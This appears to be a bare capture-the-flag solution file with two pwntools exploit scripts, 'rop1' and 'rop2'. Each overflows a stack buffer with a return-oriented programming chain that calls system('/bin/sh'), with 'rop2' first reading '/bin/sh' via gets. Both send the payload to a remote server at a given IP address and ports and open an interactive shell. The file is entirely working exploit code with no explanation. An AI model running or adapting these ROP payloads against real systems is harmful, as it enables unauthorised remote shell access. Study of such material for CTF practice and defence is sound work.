# rop1
```python
from pwn import *
sh_addr=0x601070
sys_addr=0x400630
rdi_addr=0x4008e3
pay='a'*(0x4+8)+p64(rdi_addr)+p64(sh_addr)+p64(sys_addr)
#p=process('./rop1')
p=remote('129.211.58.26',10001)
p.sendline(pay)
p.interactive()
```

# rop2
```python
from pwn import *

sh_addr=0x601080
sh='/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
get_addr=0x400670
sys_addr=0x400630
rdi_addr=0x4008e3

pay='a'*(0x4+8)+p64(rdi_addr)+p64(sh_addr)+p64(get_addr)+p64(rdi_addr)+p64(sh_addr)+p64(sys_addr)
#p=process('./rop2')
p=remote('129.211.58.26',10002)
p.sendline(pay)
p.sendline(sh)
p.interactive()
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTE2MTAzODAyMDAsODA3Njk3MDgzXX0=
-->